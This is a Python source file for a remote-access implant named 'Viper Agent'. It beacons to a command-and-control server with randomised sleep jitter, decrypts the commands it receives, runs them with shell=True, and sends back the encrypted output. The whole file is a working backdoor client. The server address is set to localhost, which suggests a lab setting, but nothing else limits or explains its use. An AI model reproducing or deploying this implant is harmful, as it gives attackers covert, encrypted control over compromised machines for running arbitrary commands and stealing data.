import requests
import time
import subprocess
import os
import viper_crypto
import random

SERVER_URL = "http://127.0.0.1:5000"
BASE_SLEEP = 5
JITTER_MAX = 10

def connect_to_server():
    while True:
        try:
            response = requests.get(f"{SERVER_URL}/heartbeat")
            data = response.json()
            encrypted_command = data.get("command")
            if encrypted_command and encrypted_command != "None":
                print(f"[*] Received command (encrypted): {encrypted_command}") 
                command = viper_crypto.decrypt_data(encrypted_command)
                if command is None:
                    print("[-] Failed to decrypt command.")
                    continue
                print(f"[*] Received command (decrypted): {command}")
                if command.startswith("cd"):
                    try:
                        os.chdir(command[3:])
                        output = f"Changed directory to {os.getcwd()}"
                    except Exception as e:
                        output = str(e)
                else:
                    proc = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = proc.stdout + proc.stderr
                    if not output:
                        output = "Command executed with no output."
                encrypted_output = viper_crypto.encrypt_data(output)
                requests.post(f"{SERVER_URL}/result", json={"output": encrypted_output})
            else:
                pass
            sleep_time = BASE_SLEEP + random.uniform(0, JITTER_MAX)
            time.sleep(sleep_time)
        except Exception as e:
            print(f"[-] Connection error: {e}")
            time.sleep(10)
            
if __name__ == "__main__":
    print("[*] Viper Agent started...")
    connect_to_server()